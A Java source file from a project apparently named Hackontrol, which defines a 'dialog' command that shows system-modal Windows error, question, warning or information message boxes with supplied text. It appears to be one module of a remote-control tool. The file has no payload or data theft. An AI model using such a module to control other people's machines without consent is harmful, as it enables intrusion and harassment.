package com.khopan.hackontrol.command;

import com.khopan.hackontrol.source.CommandSource;
import com.khopan.win32.Win32;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;

public class DialogCommand implements Command {
	@Override
	public void register(CommandDispatcher<CommandSource> dispatcher) {
		dispatcher.register(LiteralArgumentBuilder.<CommandSource>literal("dialog").then(LiteralArgumentBuilder.<CommandSource>literal("error").then(RequiredArgumentBuilder.<CommandSource, String>argument("message", StringArgumentType.string()).executes(context -> {
			return this.message(context, Win32.MB_ICONERROR);
		})).then(RequiredArgumentBuilder.<CommandSource, String>argument("title", StringArgumentType.string()).then(RequiredArgumentBuilder.<CommandSource, String>argument("message", StringArgumentType.string()).executes(context -> {
			return this.title(context, Win32.MB_ICONERROR);
		})))).then(LiteralArgumentBuilder.<CommandSource>literal("question").then(RequiredArgumentBuilder.<CommandSource, String>argument("message", StringArgumentType.string()).executes(context -> {
			return this.message(context, Win32.MB_ICONQUESTION);
		})).then(RequiredArgumentBuilder.<CommandSource, String>argument("title", StringArgumentType.string()).then(RequiredArgumentBuilder.<CommandSource, String>argument("message", StringArgumentType.string()).executes(context -> {
			return this.title(context, Win32.MB_ICONQUESTION);
		})))).then(LiteralArgumentBuilder.<CommandSource>literal("warning").then(RequiredArgumentBuilder.<CommandSource, String>argument("message", StringArgumentType.string()).executes(context -> {
			return this.message(context, Win32.MB_ICONWARNING);
		})).then(RequiredArgumentBuilder.<CommandSource, String>argument("title", StringArgumentType.string()).then(RequiredArgumentBuilder.<CommandSource, String>argument("message", StringArgumentType.string()).executes(context -> {
			return this.title(context, Win32.MB_ICONWARNING);
		})))).then(LiteralArgumentBuilder.<CommandSource>literal("information").then(RequiredArgumentBuilder.<CommandSource, String>argument("message", StringArgumentType.string()).executes(context -> {
			return this.message(context, Win32.MB_ICONINFORMATION);
		})).then(RequiredArgumentBuilder.<CommandSource, String>argument("title", StringArgumentType.string()).then(RequiredArgumentBuilder.<CommandSource, String>argument("message", StringArgumentType.string()).executes(context -> {
			return this.title(context, Win32.MB_ICONINFORMATION);
		})))));
	}

	private int message(CommandContext<CommandSource> context, long type) {
		String message = StringArgumentType.getString(context, "message");
		return Win32.MessageBox(null, message, "", type | Win32.MB_SYSTEMMODAL);
	}

	private int title(CommandContext<CommandSource> context, long type) {
		String title = StringArgumentType.getString(context, "title");
		String message = StringArgumentType.getString(context, "message");
		return Win32.MessageBox(null, message, title, type | Win32.MB_SYSTEMMODAL);
	}
}
